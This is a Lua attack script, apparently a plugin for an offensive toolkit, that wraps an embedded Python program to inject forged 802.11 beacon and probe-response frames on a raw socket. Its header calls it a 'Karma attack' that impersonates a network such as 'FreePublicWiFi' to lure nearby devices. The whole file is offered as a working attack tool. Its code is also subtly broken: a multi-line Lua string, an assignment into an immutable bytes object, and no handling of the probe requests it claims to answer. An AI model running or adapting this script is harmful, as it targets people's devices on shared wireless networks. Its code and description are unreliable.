--[[
Advanced Karma Attack - Responds to all probe requests
Flags: --iface, --ssid, --count, --interval, --response-ssid, --channel
]]
local iface = flags["--iface"] or "wlan0"
local ssid = flags["--ssid"] or "FreePublicWiFi"
local channel = tonumber(flags["--channel"] or "6")
local count = tonumber(flags["--count"] or "100")
local interval = tonumber(flags["--interval"] or "10")
local response_ssid = flags["--response-ssid"] or ssid

print("[KARMA] Starting karma attack on " .. iface .. " ch" .. channel)
print("[KARMA] Responding as: '" .. response_ssid .. "'")
print("[KARMA] Targeted SSID: '" .. ssid .. "'")

local cmd = string.format("python3 -c \"
import socket, struct, time, random
iface = '%s'
ssid = '%s'
ch = %d
count = %d
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
s.bind((iface, 0))
for i in range(count):
    mac = bytes([random.randint(0,255) for _ in range(6)])
    mac[0] = (mac[0] & 0xFE) | 0x02
    # Beacon
    frame = bytes.fromhex('80000000ffffffffffff') + mac * 2 + bytes.fromhex('0000')
    frame += struct.pack('<Q', int(time.time())) + struct.pack('<H', 100) + struct.pack('<H', 0x0431)
    frame += bytes([0, len(ssid)]) + ssid.encode()
    frame += bytes([1,8,0x82,0x84,0x8b,0x96,0x0c,0x12,0x18,0x24])
    frame += bytes([3,1,ch])
    try:
        s.send(frame)
        time.sleep(0.01)
    except: pass
    # Probe Response
    pframe = bytes.fromhex('50000000000000000000') + mac + bytes.fromhex('ffffffffffff') + bytes.fromhex('0000')
    pframe += bytes([0, len(ssid)]) + ssid.encode()
    try: s.send(pframe)
    except: pass
    if i %% 10 == 0:
        print('[KARMA] Sent ' + str(i) + ' frames')
print('[KARMA] Attack complete: ' + str(count) + ' frames sent')
\" 2>&1",
    iface, response_ssid, channel, count)

local f = io.popen(cmd)
if f then
    for line in f:lines() do print("  " .. line) end
    f:close()
end
